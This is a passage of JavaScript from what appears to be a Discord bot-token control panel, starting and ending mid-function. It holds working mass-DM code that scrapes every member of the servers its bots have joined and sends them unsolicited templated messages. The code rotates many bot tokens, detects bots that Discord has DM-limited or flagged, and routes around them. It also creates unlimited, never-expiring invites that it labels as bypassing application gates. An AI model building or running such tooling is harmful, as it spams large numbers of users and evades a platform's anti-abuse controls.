  if (!fetched) el.innerHTML = '<p class="empty">could not fetch any server info.</p>';
  scRunning = false;
}

function updateTotalMembers() {
  const total = Object.values(serverCache).reduce((sum, g) => sum + (g.approximate_member_count || 0), 0);
  const el = document.getElementById('sc-total-members');
  if (el) el.textContent = total > 0 ? total.toLocaleString() : '—';
}

function clearServerCache() {
  serverCache = {}; S.set('serverCache', {});
  document.getElementById('sc-result').innerHTML = '<p class="empty">run server checker to see results.</p>';
  document.getElementById('sc-count').textContent = '0';
  updateTotalMembers();
}

function buildServerCard(g) {
  const iconUrl = g.icon ? `https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png?size=64` : null;
  const iconHtml = iconUrl
    ? `<img class="server-icon" src="${iconUrl}" onerror="this.outerHTML='<div class=server-icon-ph>${esc(g.name[0])}</div>'">`
    : `<div class="server-icon-ph">${esc(g.name[0])}</div>`;
  const rows = [
    ['id', esc(g.id)], ['owner', g._owner_username ? `${esc(g._owner_username)} | ${esc(g.owner_id)}` : esc(g.owner_id)],
    ['members', g.approximate_member_count   != null ? g.approximate_member_count.toLocaleString()   : '—'],
    ['online',  g.approximate_presence_count != null ? g.approximate_presence_count.toLocaleString() : '—'],
    ['boost lvl', g.premium_tier != null ? `level ${g.premium_tier}` : '—'],
    ['verified', g.verified ? 'yes' : 'no'],
  ];
  const bots = g._bots || [];
  const botNames = bots.map(t => { const meta = tokenMeta[t]; return meta ? esc(meta.username) : esc(mask(t)); });
  const botsHtml = botNames.length ? botNames.map(n => `<span class="sc-bot-tag">${n}</span>`).join('') : '<span class="dim-text">—</span>';
  const hasBot = bots.length > 0;
  const tokenArg = hasBot ? `'${bots[0]}'` : 'null';
  return `<div class="sc-card">
    <div class="sc-header">
      ${iconHtml}
      <span class="sc-name">${esc(g.name)}</span>
      <button class="btn-ghost btn-xs sc-copy-id" onclick="copyServerId('${g.id}', this)" title="copy server id">copy id</button>
      <button class="btn-ghost btn-xs sc-invite-btn" onclick="createServerInvite('${g.id}', ${tokenArg}, this)" title="generate invite link" ${!hasBot ? 'disabled' : ''}>copy invite</button>
    </div>
    <div class="sc-grid">
      ${rows.map(([k,v]) => `<span class="sc-key">${k}</span><span class="sc-val">${v}</span>`).join('')}
      <span class="sc-key">bots</span><span class="sc-val sc-bots-val">${botsHtml}</span>
    </div>
  </div>`;
}

async function createServerInvite(guildId, token, btn) {
  if (!token) { flashNotify('no bot available for this server'); return; }
  const orig = btn.textContent;
  btn.textContent = '...';
  btn.disabled = true;
  try {
    // Check if guild has application/screening requirement
    const guild = serverCache[guildId];
    const hasApplicationGate = guild && Array.isArray(guild.features) &&
      (guild.features.includes('APPLICATION_REQUIRED') ||
       guild.features.includes('MEMBER_VERIFICATION_GATE_ENABLED'));

    // Find a text channel to create the invite in
    const channels = await dGet(`/guilds/${guildId}/channels`, token);
    const textCh = channels.find(c => c.type === 0); // GUILD_TEXT
    if (!textCh) { flashNotify('no text channel found'); btn.textContent = orig; btn.disabled = false; return; }

    const payload = {
      max_age: 0,    // never expires
      max_uses: 0,   // unlimited uses
      unique: true,
    };

    const res = await dPost(`/channels/${textCh.id}/invites`, token, payload);
    if (!res.ok) {
      const b = await res.json().catch(() => ({}));
      flashNotify(`failed: ${b.message || res.status}`);
      btn.textContent = orig; btn.disabled = false; return;
    }
    const inv = await res.json();
    const url = `https://discord.gg/${inv.code}`;
    await navigator.clipboard.writeText(url);
    const bypassed = hasApplicationGate ? ' (bypass application)' : '';
    btn.textContent = '✓ copied';
    flashNotify(`invite copied${bypassed}: ${url}`);
    setTimeout(() => { btn.textContent = orig; btn.disabled = false; }, 2500);
  } catch(e) {
    flashNotify(`error: ${e.message}`);
    btn.textContent = orig; btn.disabled = false;
  }
}

function copyServerId(id, btn) {
  navigator.clipboard.writeText(id).then(() => {
    const orig = btn.textContent;
    btn.textContent = '✓';
    setTimeout(() => btn.textContent = orig, 1200);
  });
}

function renderServerResults() {
  const el = document.getElementById('sc-result');
  if (!el) return;
  const ids = Object.keys(serverCache);
  if (!ids.length) { el.innerHTML = '<p class="empty">run server checker to see results.</p>'; return; }

  const search  = (document.getElementById('sc-search')?.value || '').toLowerCase();
  const sort    = document.getElementById('sc-sort')?.value || 'default';
  const filter  = document.getElementById('sc-filter-verified')?.value || 'all';

  let list = ids.map(id => serverCache[id]);

  // filter
  if (filter === 'verified')   list = list.filter(g => g.verified);
  if (filter === 'unverified') list = list.filter(g => !g.verified);

  // search
  if (search) list = list.filter(g => g.name.toLowerCase().includes(search));

  // sort
  if (sort === 'members-desc') list.sort((a, b) => (b.approximate_member_count || 0) - (a.approximate_member_count || 0));
  if (sort === 'members-asc')  list.sort((a, b) => (a.approximate_member_count || 0) - (b.approximate_member_count || 0));
  if (sort === 'boost-desc')   list.sort((a, b) => (b.premium_tier || 0) - (a.premium_tier || 0));
  if (sort === 'name-asc')     list.sort((a, b) => a.name.localeCompare(b.name));

  if (!list.length) { el.innerHTML = '<p class="empty">no servers match.</p>'; return; }
  el.innerHTML = list.map(g => buildServerCard(g)).join('');
}

function restoreServerCache() {
  const ids = Object.keys(serverCache);
  if (!ids.length) return;
  document.getElementById('sc-count').textContent = ids.length;
  updateTotalMembers();
  renderServerResults();
}

// ── Embed builder ──────────────────────────────────────────────
function getEmbedPayload() {
  const title      = document.getElementById('eb-title').value.trim();
  const desc       = document.getElementById('eb-desc').value.trim();
  const url        = document.getElementById('eb-url').value.trim();
  const color      = parseInt(document.getElementById('eb-color').value.replace('#',''), 16);
  const authorName = document.getElementById('eb-author-name').value.trim();
  const authorIcon = document.getElementById('eb-author-icon').value.trim();
  const thumbnail  = document.getElementById('eb-thumbnail').value.trim();
  const image      = document.getElementById('eb-image').value.trim();
  const footerText = document.getElementById('eb-footer-text').value.trim();
  const footerIcon = document.getElementById('eb-footer-icon').value.trim();
  const useTs      = document.getElementById('eb-timestamp')?.checked;

  const embed = { color };
  if (title)      embed.title = title;
  if (url)        embed.url   = url;
  if (desc)       embed.description = desc;
  if (authorName) embed.author = { name: authorName, ...(authorIcon && { icon_url: authorIcon }) };
  if (thumbnail)  embed.thumbnail = { url: thumbnail };
  if (image)      embed.image     = { url: image };
  if (footerText) embed.footer = { text: footerText, ...(footerIcon && { icon_url: footerIcon }) };
  if (useTs)      embed.timestamp = new Date().toISOString();

  // fields
  const fieldRows = document.querySelectorAll('.eb-field-row');
  if (fieldRows.length) {
    const fields = [];
    fieldRows.forEach(row => {
      const name   = row.querySelector('.eb-field-name')?.value.trim();
      const value  = row.querySelector('.eb-field-value')?.value.trim();
      const inline = row.querySelector('.eb-field-inline')?.checked;
      if (name && value) fields.push({ name, value, inline: !!inline });
    });
    if (fields.length) embed.fields = fields;
  }
  return embed;
}

function addEmbedField() {
  const container = document.getElementById('eb-fields-container');
  const row = document.createElement('div');
  row.className = 'eb-field-row';
  row.innerHTML = `
    <div class="field"><label>name</label><input type="text" class="eb-field-name" placeholder="field name" oninput="renderEmbedPreview()"></div>
    <div class="field"><label>value</label><input type="text" class="eb-field-value" placeholder="field value" oninput="renderEmbedPreview()"></div>
    <div class="field inline-field"><label>inline</label><label class="toggle" style="margin-left:8px"><input type="checkbox" class="eb-field-inline" onchange="renderEmbedPreview()"><span class="toggle-track"><span class="toggle-thumb"></span></span></label>
    <button class="btn-del btn-xs" onclick="this.closest('.eb-field-row').remove();renderEmbedPreview()">✕</button></div>`;
  container.appendChild(row);
  renderEmbedPreview();
}

function copyEmbedJSON() {
  const json = JSON.stringify({ embeds: [getEmbedPayload()] }, null, 2);
  navigator.clipboard.writeText(json).then(() => {
    const btn = document.getElementById('eb-copy-json');
    if (btn) { btn.textContent = '✓ copied'; setTimeout(() => btn.textContent = 'copy json', 1500); }
  });
}

function renderEmbedPreview() {
  const color      = document.getElementById('eb-color').value;
  const title      = document.getElementById('eb-title').value.trim();
  const desc       = document.getElementById('eb-desc').value.trim();
  const url        = document.getElementById('eb-url').value.trim();
  const authorName = document.getElementById('eb-author-name').value.trim();
  const authorIcon = document.getElementById('eb-author-icon').value.trim();
  const thumbnail  = document.getElementById('eb-thumbnail').value.trim();
  const image      = document.getElementById('eb-image').value.trim();
  const footerText = document.getElementById('eb-footer-text').value.trim();
  const footerIcon = document.getElementById('eb-footer-icon').value.trim();

  document.getElementById('de-pill').style.background = color;

  const authorEl = document.getElementById('de-author');
  if (authorName) {
    authorEl.style.display = 'flex';
    document.getElementById('de-author-name').textContent = authorName;
    const ai = document.getElementById('de-author-icon');
    if (authorIcon) { ai.src = authorIcon; ai.style.display = ''; } else ai.style.display = 'none';
  } else authorEl.style.display = 'none';

  const titleEl = document.getElementById('de-title');
  if (title) {
    titleEl.innerHTML = url ? `<a href="${esc(url)}" target="_blank">${esc(title)}</a>` : esc(title);
    titleEl.style.display = '';
  } else titleEl.style.display = 'none';

  const descEl = document.getElementById('de-desc');
  descEl.textContent = desc; descEl.style.display = desc ? '' : 'none';

  const imgEl = document.getElementById('de-image');
  if (image) { imgEl.src = image; imgEl.style.display = ''; } else imgEl.style.display = 'none';

  const thumbEl = document.getElementById('de-thumbnail');
  if (thumbnail) { thumbEl.src = thumbnail; thumbEl.style.display = ''; } else thumbEl.style.display = 'none';

  const footerEl = document.getElementById('de-footer');
  if (footerText) {
    footerEl.style.display = 'flex';
    document.getElementById('de-footer-text').textContent = footerText;
    const fi = document.getElementById('de-footer-icon');
    if (footerIcon) { fi.src = footerIcon; fi.style.display = ''; } else fi.style.display = 'none';
  } else footerEl.style.display = 'none';

  document.getElementById('eb-json').textContent = JSON.stringify({ embeds: [getEmbedPayload()] }, null, 2);
  renderDMPreview();
}

async function sendEmbed() {
  if (!tokens.length) { modalAlert('no tokens loaded.'); return; }
  const channelId = document.getElementById('eb-channel-id').value.trim();
  if (!channelId) { modalAlert('enter a channel id.'); return; }
  const statusEl = document.getElementById('eb-status');
  statusEl.textContent = 'sending...';
  const embed = getEmbedPayload();
  let sent = false;
  for (const t of tokens) {
    try {
      const res = await dPost(`/channels/${channelId}/messages`, t, { embeds: [embed] });
      if (res.ok) { sent = true; break; }
    } catch {}
  }
  statusEl.textContent = sent ? '✓ sent to channel' : '✗ failed';
  setTimeout(() => statusEl.textContent = '', 3000);
}

async function sendEmbedDM() {
  if (!tokens.length) { modalAlert('no tokens loaded.'); return; }
  const guildId = document.getElementById('eb-guild-id').value.trim();
  if (!guildId) { modalAlert('enter a guild id.'); return; }
  const statusEl = document.getElementById('eb-status');
  const embed = getEmbedPayload();
  statusEl.textContent = 'fetching members...';
  let members = [];
  for (const t of tokens) {
    try { members = await fetchGuildMembers(guildId, t); if (members.length) break; } catch {}
  }
  if (!members.length) { statusEl.textContent = '✗ no members found'; return; }
  statusEl.textContent = `sending to ${members.length} members...`;
  let sent = 0, failed = 0;
  for (let i = 0; i < members.length; i++) {
    const uid = members[i].id; const token = tokens[i % tokens.length];
    try {
      const chanRes = await dPost('/users/@me/channels', token, { recipient_id: uid });
      if (!chanRes.ok) throw new Error();
      const chan = await chanRes.json();
      const msgRes = await dPost(`/channels/${chan.id}/messages`, token, { embeds: [embed] });
      if (msgRes.ok) sent++; else failed++;
    } catch { failed++; }
    await sleep(dmDelay * 1000);
  }
  statusEl.textContent = `✓ sent: ${sent}, failed: ${failed}`;
  setTimeout(() => statusEl.textContent = '', 5000);
}

// ── Webhook ────────────────────────────────────────────────────
function renderWebhookPreview() {
  const username = document.getElementById('wh-username').value.trim();
  const avatar   = document.getElementById('wh-avatar').value.trim();
  const content  = document.getElementById('wh-content').value;
  const useEmbed = document.getElementById('wh-embed').checked;

  document.getElementById('wh-preview-name').textContent = username || 'webhook';
  const img = document.getElementById('wh-avatar-img');
  if (avatar) { img.src = avatar; img.style.display = ''; } else img.style.display = 'none';

  const contentEl = document.getElementById('wh-preview-content');
  contentEl.textContent = content; contentEl.style.display = content ? '' : 'none';

  const embedWrap = document.getElementById('wh-preview-embed-wrap');
  if (useEmbed) {
    embedWrap.style.display = '';
    const color = document.getElementById('eb-color').value;
    const title = document.getElementById('eb-title').value.trim();
    const desc  = document.getElementById('eb-desc').value.trim();
    const url   = document.getElementById('eb-url').value.trim();
    const authorName = document.getElementById('eb-author-name').value.trim();
    const authorIcon = document.getElementById('eb-author-icon').value.trim();
    const thumbnail  = document.getElementById('eb-thumbnail').value.trim();
    const image      = document.getElementById('eb-image').value.trim();
    const footerText = document.getElementById('eb-footer-text').value.trim();
    const footerIcon = document.getElementById('eb-footer-icon').value.trim();

    document.getElementById('wh-de-pill').style.background = color;
    const authorEl = document.getElementById('wh-de-author');
    if (authorName) {
      authorEl.style.display = 'flex';
      document.getElementById('wh-de-author-name').textContent = authorName;
      const ai = document.getElementById('wh-de-author-icon');
      if (authorIcon) { ai.src = authorIcon; ai.style.display = ''; } else ai.style.display = 'none';
    } else authorEl.style.display = 'none';
    const titleEl = document.getElementById('wh-de-title');
    if (title) { titleEl.innerHTML = url ? `<a href="${esc(url)}" target="_blank">${esc(title)}</a>` : esc(title); titleEl.style.display = ''; } else titleEl.style.display = 'none';
    const descEl = document.getElementById('wh-de-desc');
    descEl.textContent = desc; descEl.style.display = desc ? '' : 'none';
    const imgEl = document.getElementById('wh-de-image');
    if (image) { imgEl.src = image; imgEl.style.display = ''; } else imgEl.style.display = 'none';
    const thumbEl = document.getElementById('wh-de-thumbnail');
    if (thumbnail) { thumbEl.src = thumbnail; thumbEl.style.display = ''; } else thumbEl.style.display = 'none';
    const footerEl = document.getElementById('wh-de-footer');
    if (footerText) {
      footerEl.style.display = 'flex';
      document.getElementById('wh-de-footer-text').textContent = footerText;
      const fi = document.getElementById('wh-de-footer-icon');
      if (footerIcon) { fi.src = footerIcon; fi.style.display = ''; } else fi.style.display = 'none';
    } else footerEl.style.display = 'none';
  } else embedWrap.style.display = 'none';
}

function saveWebhookUrl(url) {
  if (!url) return;
  if (!webhookHistory.includes(url)) {
    webhookHistory.unshift(url);
    if (webhookHistory.length > 10) webhookHistory.pop();
    S.set('webhookHistory', webhookHistory);
    renderWebhookHistory();
  }
}

function renderWebhookHistory() {
  const el = document.getElementById('wh-history');
  if (!el) return;
  if (!webhookHistory.length) { el.innerHTML = '<p class="empty">no history.</p>'; return; }
  el.innerHTML = webhookHistory.map((u, i) => `
    <div class="token-item">
      <span class="token-val" style="cursor:pointer" onclick="document.getElementById('wh-url').value='${esc(u)}';renderWebhookPreview()">${esc(u.slice(0,60))}${u.length>60?'…':''}</span>
      <button class="btn-ghost btn-xs" onclick="webhookHistory.splice(${i},1);S.set('webhookHistory',webhookHistory);renderWebhookHistory()">✕</button>
    </div>`).join('');
}

async function sendWebhook() {
  const url      = document.getElementById('wh-url').value.trim();
  const content  = document.getElementById('wh-content').value.trim();
  const username = document.getElementById('wh-username').value.trim();
  const avatar   = document.getElementById('wh-avatar').value.trim();
  const useEmbed = document.getElementById('wh-embed').checked;
  const logEl    = document.getElementById('wh-log');
  const statusEl = document.getElementById('wh-status');
  const schedMs  = getScheduleMs();

  if (!url) { modalAlert('enter a webhook url.'); return; }
  if (!content && !useEmbed) { modalAlert('add a message or attach an embed.'); return; }

  const body = {};
  if (content)  body.content    = content;
  if (username) body.username   = username;
  if (avatar)   body.avatar_url = avatar;
  if (useEmbed) body.embeds     = [getEmbedPayload()];

  if (schedMs > 0) {
    statusEl.textContent = `scheduled in ${(schedMs/1000).toFixed(0)}s`;
    logEl.innerHTML += `<div class="log-line log-info">[~] scheduled in ${(schedMs/1000).toFixed(0)}s...</div>`;
    await sleep(schedMs);
  }

  statusEl.textContent = 'sending...';
  logEl.innerHTML += `<div class="log-line log-info">[~] posting to webhook...</div>`;
  try {
    const res = await fetch(PROXY(url), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
    if (res.ok || res.status === 204) {
      logEl.innerHTML += `<div class="log-line log-ok">[✓] delivered.</div>`;
      statusEl.textContent = '✓ sent';
      saveWebhookUrl(url);
    } else {
      const b = await res.json().catch(() => ({}));
      logEl.innerHTML += `<div class="log-line log-err">[✗] HTTP ${res.status} — ${b.message || ''}</div>`;
      statusEl.textContent = '✗ failed';
    }
  } catch(e) {
    logEl.innerHTML += `<div class="log-line log-err">[✗] ${e.message}</div>`;
    statusEl.textContent = '✗ error';
  }
  logEl.scrollTop = logEl.scrollHeight;
  setTimeout(() => statusEl.textContent = '', 3000);
}

function getScheduleMs() {
  const val = document.getElementById('wh-schedule')?.value.trim();
  if (!val) return 0;
  const n = parseFloat(val);
  return isNaN(n) || n <= 0 ? 0 : n * 1000;
}

// ── Token checker ──────────────────────────────────────────────
async function validateSingleToken(i) {
  const t = tokens[i];
  if (!t) return;
  try {
    const d = await dGet('/users/@me', t);
    const name = d.username + (d.discriminator && d.discriminator !== '0' ? '#' + d.discriminator : '');
    const avatarUrl = d.avatar
      ? `https://cdn.discordapp.com/avatars/${d.id}/${d.avatar}.png?size=32`
      : `https://cdn.discordapp.com/embed/avatars/${Number(BigInt(d.id) >> 22n) % 6}.png`;
    tokenMeta[t] = { username: name, id: d.id, avatar: d.avatar, avatarUrl };
    S.set('tokenMeta', tokenMeta);
    tokenStatus[t] = 'valid'; S.set('tokenStatus', tokenStatus);
    updateTokenItem(i, t, 'valid');
    log('ok', `[✓] auto-check: ${name}`);
  } catch {
    tokenStatus[t] = 'invalid'; S.set('tokenStatus', tokenStatus);
    updateTokenItem(i, t, 'invalid');
    log('err', `[✗] auto-check failed: ${mask(t)}`);
  }
}

async function checkTokens() {
  if (!tokens.length) { modalAlert('no tokens loaded.'); return; }
  const el = document.getElementById('checker-results');
  el.innerHTML = ''; renderTokens();
  log('info', `[~] checking ${tokens.length} token(s)...`);
  showCheckerProgress(0, `checking 0 / ${tokens.length}...`);

  for (let i = 0; i < tokens.length; i++) {
    showCheckerProgress((i / tokens.length) * 100, `checking ${i + 1} / ${tokens.length}...`);
    try {
      const d = await dGet('/users/@me', tokens[i]);
      const name = d.username + (d.discriminator && d.discriminator !== '0' ? '#' + d.discriminator : '');
      const avatarUrl = d.avatar
        ? `https://cdn.discordapp.com/avatars/${d.id}/${d.avatar}.png?size=32`
        : `https://cdn.discordapp.com/embed/avatars/${Number(BigInt(d.id) >> 22n) % 6}.png`;
      tokenMeta[tokens[i]] = { username: name, id: d.id, avatar: d.avatar, avatarUrl };
      S.set('tokenMeta', tokenMeta);

      // ── DM-limit probe ──────────────────────────────────────────
      // Try opening a DM channel to a known non-existent/self user.
      // A limited bot gets 403/400 with code 40003 or 110001 here.
      let dmLimited = false;
      try {
        const probe = await fetch(PROXY(`${DISCORD}/users/@me/channels`), {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', Authorization: `Bot ${tokens[i]}` },
          body: JSON.stringify({ recipient_id: d.id }), // opening DM with self = instant 400
        });
        const pb = await probe.json().catch(() => ({}));
        // code 40003 = not allowed (DM-limited), 110001 = cannot send to this user (flagged)
        if (pb.code === 40003 || pb.code === 110001 || probe.status === 403) dmLimited = true;
      } catch { /* network error, skip probe */ }

      tokenStatus[tokens[i]] = dmLimited ? 'limited' : 'valid';
      S.set('tokenStatus', tokenStatus);
      updateTokenItem(i, tokens[i], tokenStatus[tokens[i]]);

      const statusLabel = dmLimited ? '⚠ limited' : 'valid';
      el.innerHTML += `<div class="token-item">
        <img class="bot-avatar" src="${avatarUrl}" onerror="this.style.display='none'">
        <span class="bot-name">${esc(name)}</span>
        <span class="token-id">${d.id}</span>
        <span class="status status-${tokenStatus[tokens[i]]}">${statusLabel}</span>
        <button class="btn-ghost btn-xs" onclick="copyInvite('${d.id}')" title="copy invite link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="12" height="12"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg></button>
      </div>`;
      if (dmLimited) log('warn', `[⚠] bot ${i+1}: ${name} — valid but DMS are limited`);
      else log('ok', `[✓] bot ${i+1}: ${name} (${d.id})`);
    } catch(e) {
      el.innerHTML += `<div class="token-item"><div class="bot-avatar-placeholder"></div><span class="token-val">${mask(tokens[i])}</span><span class="status status-invalid">invalid</span></div>`;
      tokenStatus[tokens[i]] = 'invalid'; S.set('tokenStatus', tokenStatus);
      updateTokenItem(i, tokens[i], 'invalid');
      log('err', `[✗] bot ${i+1}: ${e.message}`);
    }
    await sleep(400);
  }

  showCheckerProgress(100, `done — ${tokens.length} token(s) checked`);
  setTimeout(hideCheckerProgress, 3000);
  renderTokens();
  log('info', '[~] done.');
  flashNotify('token check complete');
}

// ── Mass DM ────────────────────────────────────────────────────
function stopDM() { dmStop = true; dmPaused = false; log('warn', '[■] Stopping...'); updateDMButtons(); }
function pauseDM() {
  if (!dmRunning) return;
  dmPaused = true;
  setStatus('paused'); log('info', '[⏸] Paused.'); updateDMButtons();
}
function resumeDM() {
  if (!dmRunning) return;
  dmPaused = false;
  setStatus('running'); log('info', '[▶] Resumed.'); updateDMButtons();
  dmEtaStartTime = Date.now() - (dmEtaDone > 0 ? Math.round(dmEtaDone * dmDelay * 1000) : 0);
}
function updateDMButtons() {
  const show = (id, visible) => { const el = document.getElementById(id); if (el) el.style.display = visible ? '' : 'none'; };
  const running  = dmRunning;
  const paused   = dmPaused;
  show('btn-pause',         running && !paused);
  show('btn-resume',        running &&  paused);
  show('btn-pause-global',  running && !paused);
  show('btn-resume-global', running &&  paused);
}

async function startMassDM(mode) {
  if (dmRunning) { modalAlert('already running.'); return; }
  if (!tokens.length) { modalAlert('no tokens loaded.'); return; }
  if (!dmMessage.trim()) { modalAlert('no message set.'); return; }
  if (mode === 'single' && !document.getElementById('guild-id').value.trim()) {
    modalAlert('enter at least one guild id.'); return;
  }
  dmRunning = true; dmStop = false; dmPaused = false;
  statSent = 0; statFailed = 0;
  tokenStats = {};
  tokens.forEach(t => { tokenStats[t] = { sent: 0, failed: 0 }; });
  setStatus('running'); updateStats(); setProgress(0);
  updateDMButtons();
  document.getElementById('dm-log').innerHTML = '';
  log('info', `[~] Starting (${mode}) with ${tokens.length} token(s)...`);
  if (skipList.length) log('info', `[~] Skip list: ${skipList.length} user(s)`);
  try {
    if (mode === 'single') {
      const rawIds = document.getElementById('guild-id').value;
      const guildIds = rawIds.split(',').map(s => s.trim()).filter(Boolean);
      log('info', `[~] ${guildIds.length} guild id(s) queued`);
      for (let gi = 0; gi < guildIds.length; gi++) {
        if (dmStop) break;
        if (guildIds.length > 1) log('info', `[~] Guild ${gi + 1}/${guildIds.length}: ${guildIds[gi]}`);
        await dmSingleServer(guildIds[gi]);
      }
    } else await dmGlobal();
  } catch(e) {
    log('err', '[✗] Fatal: ' + e.message);
  }
  dmRunning = false;
  dmPaused = false;
  etaStop();
  updateDMButtons();
  setStatus(dmStop ? 'stopped' : 'done');
  log('info', `[✓] done — sent: ${statSent}, failed: ${statFailed}`);
  tokens.forEach((t, i) => {
    const s = tokenStats[t];
    if (!s || (s.sent === 0 && s.failed === 0)) return;
    const meta = tokenMeta[t];
    const name = meta ? meta.username : `bot ${i+1}`;
    log('info', `    ${name} → sent: ${s.sent}, failed: ${s.failed}`);
  });
  updateStats();
  renderTokens(); // refresh per-token stats display
  flashNotify(`done — sent: ${statSent}, failed: ${statFailed}`);
}

async function dmSingleServer(guildId) {
  log('info', `[~] Fetching members for guild ${guildId}...`);
  
  // First, check which bots are actually in this server
  const botsInServer = [];
  for (const t of tokens) {
    try {
      const guilds = await dGet('/users/@me/guilds', t);
      if (guilds.some(g => g.id === guildId)) {
        botsInServer.push(t);
        const meta = tokenMeta[t];
        log('ok', `[✓] Bot ${meta ? meta.username : mask(t)} is in server`);
      }
    } catch(e) { log('warn', `[~] Token check failed: ${e.message}`); }
  }
  
  if (!botsInServer.length) {
    log('err', '[✗] No bots found in this server!');
    return;
  }
  
  log('info', `[~] ${botsInServer.length} bot(s) confirmed in server`);
  
  let members = [];
  for (const t of botsInServer) {
    try {
      members = await fetchGuildMembers(guildId, t);
      if (members.length) { log('ok', `[✓] Fetched ${members.length} member(s)`); break; }
    } catch(e) { log('warn', `[~] Token failed: ${e.message}`); }
  }
  if (!members.length) { log('err', '[✗] Could not fetch members.'); return; }
  
  // Only use bots that are in the server
  await dmMembers(members, botsInServer, guildId);
}

async function dmGlobal() {
  log('info', '[~] Collecting guilds...');
  const guildMap = {};
  for (let i = 0; i < tokens.length; i++) {
    try {
      const guilds = await dGet('/users/@me/guilds', tokens[i]);
      guilds.forEach(g => {
        if (!guildMap[g.id]) guildMap[g.id] = [];
        guildMap[g.id].push(tokens[i]);
      });
      log('ok', `[✓] Token ${i+1}: ${guilds.length} guild(s)`);
    } catch(e) { log('err', `[✗] Token ${i+1}: ${e.message}`); }
    if (dmStop) return;
  }
  const guildIds = Object.keys(guildMap).filter(id => !serverSkipList.includes(id));
  const skippedServers = Object.keys(guildMap).length - guildIds.length;
  if (skippedServers > 0) log('info', `[~] Skipped ${skippedServers} server(s) from skip list`);
  log('info', `[~] ${guildIds.length} guild(s). Fetching members...`);
  
  // Track which users can be reached by which bots (via shared servers)
  const userBotMap = new Map(); // userId -> Set of tokens that share a server with them
  const seen = new Map();
  
  for (let gi = 0; gi < guildIds.length; gi++) {
    if (dmStop) break;
    const gid = guildIds[gi];
    log('info', `[~] Guild ${gi+1}/${guildIds.length} — ${gid}`);
    let ok = false;
    for (const t of guildMap[gid]) {
      try {
        const members = await fetchGuildMembers(gid, t);
        members.forEach(u => {
          if (!seen.has(u.id)) {
            u.guildName = gid; // store guild for variable replacement
            seen.set(u.id, u);
          }
          // Track that this bot can reach this user
          if (!userBotMap.has(u.id)) userBotMap.set(u.id, new Set());
          userBotMap.get(u.id).add(t);
        });
        log('ok', `[✓] ${members.length} member(s) from ${gid}`);
        ok = true; break;
      } catch(e) { log('err', `[✗] ${gid}: ${e.message}`); }
    }
    if (!ok) log('warn', `[~] Could not fetch ${gid}`);
    setProgress((gi+1) / guildIds.length * 50);
  }
  const allEntries = [...seen.values()];
  log('info', `[~] ${allEntries.length} unique user(s). Sending DMs...`);
  await dmMembers(allEntries, tokens, null, userBotMap);
}

async function fetchGuildMembers(guildId, token) {
  const members = [];
  let after = '0';
  while (true) {
    const chunk = await dGet(`/guilds/${guildId}/members?limit=1000&after=${after}`, token);
    if (!chunk.length) break;
    chunk.forEach(m => {
      if (!m.user.bot) members.push({ id: m.user.id, username: m.user.username });
    });
    if (chunk.length < 1000) break;
    after = chunk[chunk.length - 1].user.id;
  }
  return members;
}

const DISCORD_ERRORS = {
  50007: 'cannot send messages to this user (DMs closed)',
  50278: 'user cannot be DMed (no mutual server or DMs disabled)',
  50013: 'missing permissions', 50001: 'missing access',
  10013: 'unknown user', 40001: 'unauthorized',
  40003: 'bot is DM-limited / not allowed to send DMs',
  110001: 'bot flagged — cannot send DMs',
  20009: 'explicit content blocked', 50035: 'invalid form body',
};

// Codes that indicate the bot itself is limited/flagged (not the recipient's settings)
const DM_LIMIT_CODES = new Set([40003, 110001]);

function applyVars(template, user) {
  const today = new Date().toLocaleDateString();
  return template
    .replace(/\{username\}/gi,  user.username || 'user')
    .replace(/\{userid\}/gi,    user.id)
    .replace(/\{mention\}/gi,   `<@${user.id}>`)
    .replace(/<@userid>/gi,     `<@${user.id}>`)
    .replace(/\{date\}/gi,      today)
    .replace(/\{server\}/gi,    user.guildName || '');
}

async function dmMembers(userEntries, toks, guildId = null, userBotMap = null) {
  if (!toks.length) return;
  const skipSet = new Set(skipList);
  const filtered = userEntries.filter(u => {
    const id = typeof u === 'string' ? u : u.id;
    return !skipSet.has(id);
  });
  if (filtered.length < userEntries.length)
    log('info', `[~] Skipped ${userEntries.length - filtered.length} user(s) from skip list`);

  const useEmbed = document.getElementById('dm-use-embed')?.checked;
  
  // Build bot-to-users mapping based on server membership
  let botUserMap;
  if (userBotMap) {
    // Global mode: assign users to bots that share servers with them
    botUserMap = new Map();
    toks.forEach(t => botUserMap.set(t, []));
    
    filtered.forEach(entry => {
      const uid = typeof entry === 'string' ? entry : entry.id;
      const validBots = userBotMap.get(uid);
      if (validBots && validBots.size > 0) {
        // Assign to the bot with fewest users (load balancing)
        let minBot = null;
        let minCount = Infinity;
        for (const bot of validBots) {
          if (botUserMap.has(bot)) {
            const count = botUserMap.get(bot).length;
            if (count < minCount) {
              minCount = count;
              minBot = bot;
            }
          }
        }
        if (minBot) botUserMap.get(minBot).push(entry);
      }
    });
  } else {
    // Single server mode: distribute evenly across all bots
    botUserMap = new Map();
    toks.forEach((t, ti) => {
      botUserMap.set(t, filtered.filter((_, i) => i % toks.length === ti));
    });
  }
  
  const total = filtered.length;
  let done = 0;
  etaStart(total);

  // Track consecutive DM failures per bot to detect when it gets limited mid-run
  const botConsecFails = new Map();
  const botLimited     = new Set();
  toks.forEach(t => botConsecFails.set(t, 0));
  const LIMIT_THRESHOLD = 5; // consecutive hard failures → flag as limited

  await Promise.all([...botUserMap.entries()].map(async ([token, chunk]) => {
    for (const entry of chunk) {
      if (dmStop) break;
      while (dmPaused && !dmStop) await sleep(150);
      if (dmStop) break;

      // Bot already flagged — silently skip, don't count against stats
      if (botLimited.has(token)) {
        done++; dmEtaDone++;
        setProgress(50 + done / total * 50);
        continue;
      }

      const uid  = typeof entry === 'string' ? entry : entry.id;
      const user = typeof entry === 'string' ? { id: entry, username: 'user' } : entry;

      // helper: flag a bot as limited and log once
      const flagLimited = (tok) => {
        if (botLimited.has(tok)) return;
        botLimited.add(tok);
        tokenStatus[tok] = 'limited'; S.set('tokenStatus', tokenStatus);
        const botName = tokenMeta[tok]?.username || mask(tok);
        log('warn', `[⚠] ${botName} is DM-limited — skipping remaining queue`);
        flashNotify(`⚠ ${botName} flagged as DM-limited`);
